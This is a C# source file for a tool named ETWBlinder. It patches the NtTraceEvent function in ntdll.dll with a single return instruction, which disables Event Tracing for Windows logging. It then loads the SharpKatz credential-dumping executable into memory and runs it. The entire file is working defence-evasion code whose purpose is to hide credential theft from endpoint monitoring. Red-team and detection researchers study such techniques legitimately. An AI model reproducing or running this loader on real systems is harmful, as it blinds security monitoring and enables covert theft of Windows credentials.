using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace ETWBlinder
{
    class Win32
    {
        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        public static extern IntPtr LoadLibrary(
            string lpFileName);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr GetProcAddress(
            IntPtr hModule,
            string procName);

        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(
            IntPtr lpAddress,
            UIntPtr dwSize,
            MemoryProtection flNewProtect,
            out MemoryProtection lpflOldProtect);

        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }
    }

    class Program
    {
        static void Main(string[] args)
        {
            // get location of ntdll.dll
            var hModule = Win32.LoadLibrary("ntdll.dll");
            Console.WriteLine("\n[>] Resolving Addresses");
            Console.WriteLine("    |-> Found ntdll.dll: 0x{0:X}", hModule.ToInt64());

            // find NtTraceEvent
            var hfunction = Win32.GetProcAddress(
                hModule,
                "NtTraceEvent");
            Console.WriteLine("    |-> Found NtTraceEvent: 0x{0:X}", hfunction.ToInt64());

            // opcode for ret instruction 
            var patch = new byte[] { 0xC3 };

            // mark as RW
            Win32.VirtualProtect(
                hfunction,
                (UIntPtr)patch.Length,
                Win32.MemoryProtection.ExecuteReadWrite,
                out var oldProtect);
            Console.WriteLine("\n[>] Patching Memory");
            Console.WriteLine("    |-> Changing Protection to RWX!");

            // write a ret
            Marshal.Copy(patch, 0, hfunction, patch.Length);
            Console.WriteLine("    |-> ETW Patched!");

            // restore memory
            Win32.VirtualProtect(
                hfunction,
                (UIntPtr)patch.Length,
                oldProtect,
                out _);
            Console.WriteLine("    |-> Restoring Protection!");

            Console.WriteLine("\n[>] Running .NET Executable...\n");

            var bytes = File.ReadAllBytes(@"C:\Users\JesusCries\Desktop\Tools\SharpKatz\SharpKatz\bin\x64\Release\SharpKatz.exe");

            // load the assembly
            var assembly = Assembly.Load(bytes);

            // invoke its entry point with arguments
            assembly.EntryPoint.Invoke(null, new object[] { args });
        }
    }
}
